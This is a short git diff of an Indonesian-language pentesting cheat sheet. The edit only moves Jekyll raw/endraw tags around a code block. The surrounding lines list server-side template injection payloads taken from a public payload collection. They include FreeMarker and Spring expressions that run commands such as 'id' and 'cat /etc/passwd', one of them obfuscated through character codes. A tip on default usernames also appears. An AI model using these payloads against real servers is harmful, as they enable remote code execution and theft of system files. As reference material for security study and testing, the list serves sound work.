@@ -66,8 +66,8 @@ SELECT CustomerName, /*City,*/ Country FROM Customers;
 
 Kode dari [payloadbox/ssti-payloads](https://github.com/payloadbox/ssti-payloads).
 
-```python
 {% raw %}
+```python
 {{2*2}}[[3*3]]
 {{3*3}}
 {{3*'3'}}
@@ -118,8 +118,8 @@ ${"freemarker.template.utility.Execute"?new()("id")}
 ${T(java.lang.System).getenv()}
 ${T(java.lang.Runtime).getRuntime().exec('cat etc/passwd')}
 ${T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(99).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(32)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(101)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(99)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(112)).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(119)).concat(T(java.lang.Character).toString(100))).getInputStream())}
-{% endraw %}
 ```
+{% endraw %}
 
 ## Username yang Umum Digunakan
 ```admin``` paling umum digunakan.
